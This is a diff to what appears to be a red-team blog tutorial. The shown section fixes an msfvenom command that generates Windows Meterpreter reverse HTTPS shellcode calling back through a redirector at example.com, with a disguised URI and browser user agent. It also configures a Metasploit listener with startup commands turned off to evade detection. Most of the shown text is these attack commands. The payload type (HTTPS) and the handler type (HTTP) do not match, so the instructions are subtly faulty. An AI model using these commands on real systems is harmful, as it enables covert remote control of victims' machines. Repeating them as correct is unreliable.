@@ -134,16 +134,16 @@
 <h3 id="meterpreter-shellcode-is-generated-as-python-buffer">Meterpreter Shellcode is Generated as Python Buffer</h3>
 <p>The Meterpreter shellcode was created as follows and uses mostly default settings. <code>LURI</code> and <code>HTTPUSERAGENT</code> were specified to pass through my <a href="https://www.packtpub.com/en-de/learning/how-to-tutorials/obfuscating-command-and-control-c2-servers-securely-with-redirectors-tutorial" target="_blank">redirector</a> and reach the Metasploit multi/handler.</p>
 <div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p windows/x64/meterpreter_reverse_https <span class="kw">\</span></span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="va">LHOST=</span>example.com<span class="kw">\</span></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="va">LPORT=</span>443<span class="kw">\</span></span>
-<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="va">LURI=</span>/api/v1/data/<span class="kw">\</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="va">LHOST=</span>example.com <span class="kw">\</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="va">LPORT=</span>443 <span class="kw">\</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="va">LURI=</span>/api/v1/data/ <span class="kw">\</span></span>
 <span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="va">HTTPUSERAGENT=</span><span class="st">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76&quot;</span> <span class="kw">\</span></span>
 <span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">-f</span> python</span></code></pre></div>
 <p>The <code>-f python</code> generates the shellcode as hex string for python. If we wanted to use the shellcode in C we would just change it to <code>-f C</code>.</p>
 <p>We configure a listener that does not automatically load the stdapi and does not execute the sysinfo command on startup. This helps to make the shellcode less likely to be detected when executed.</p>
 <div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">use</span> multi/handler</span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">payload</span> windows/x64/meterpreter_reverse_http</span>
-<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">luri</span> /api/poll/</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">luri</span> /api/v1/data/</span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">lhost</span> 0.0.0.0</span>
 <span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">autoloadstdapi</span> false</span>
 <span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a><span class="kw">set</span> <span class="ex">autosysteminfo</span> false</span>
